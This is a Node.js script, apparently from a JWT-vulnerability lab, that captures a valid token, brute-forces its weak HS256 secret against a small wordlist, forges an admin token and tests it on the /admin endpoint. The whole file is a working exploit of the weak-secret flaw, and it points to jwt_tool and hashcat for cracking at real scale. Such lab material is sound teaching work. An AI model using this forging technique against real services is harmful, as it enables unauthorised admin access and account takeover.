/*
 * ATTACK 02 — weak HMAC secret brute force
 * -----------------------------------------
 * Root cause: the HMAC secret ("secret123") is short and dictionary-guessable.
 * Anyone who has a single valid token can crack the secret offline (no server
 * interaction) by trying candidate secrets until a signature verifies, then
 * mint arbitrary valid tokens — including admin.
 *
 * In the real world you'd use `jwt_tool` or `hashcat -m 16500`. Here we ship a
 * tiny self-contained brute-forcer so no external tools are required.
 *
 * Run:  node attacks/02-weak-secret-bruteforce.js
 */
const jwt = require('jsonwebtoken');
const { post, getAuth, banner, show, verdict, decodeJwt } = require('./_lib');

// A small illustrative wordlist. jwt_tool/hashcat would use rockyou.txt (14M words).
const WORDLIST = ['123456', 'password', 'admin', 'letmein', 'secret', 'changeme',
  'qwerty', 'jwt', 'token', 'secretkey', 'password123', 'secret123', 'supersecret'];

(async () => {
  banner('ATTACK 02 — weak-secret brute force');

  // (a) Obtain one legitimately-issued token to crack against.
  const login = await post('/login', { username: 'alice', password: 'password1' });
  const token = login.body.token || login.body.access_token;
  if (!token) { show('Login failed', login); return; }
  show('Captured legit token', token);
  show('Its header/payload', decodeJwt(token));

  // (b) Offline crack: try each candidate as the HMAC key.
  let cracked = null;
  for (const guess of WORDLIST) {
    try { jwt.verify(token, guess, { algorithms: ['HS256'] }); cracked = guess; break; }
    catch (_) { /* wrong key */ }
  }
  show('Brute-force result', cracked ? `SECRET RECOVERED = "${cracked}"` : 'secret not in wordlist');
  if (!cracked) { verdict(false, 'could not recover the secret from the wordlist.'); return; }

  // Forge an admin token signed with the cracked secret.
  const forged = jwt.sign({ sub: 'attacker', role: 'admin' }, cracked, { algorithm: 'HS256' });
  show('Forged admin token (signed with cracked secret)', forged);

  const res = await getAuth('/admin', forged);
  show(`Server response  (HTTP ${res.status})`, res.body);
  const ok = res.status === 200 && res.body && res.body.secretFlag;
  verdict(ok, ok ? 'secret cracked and forged admin token accepted.'
               : 'forged token rejected (strong secret not in wordlist).');
})();
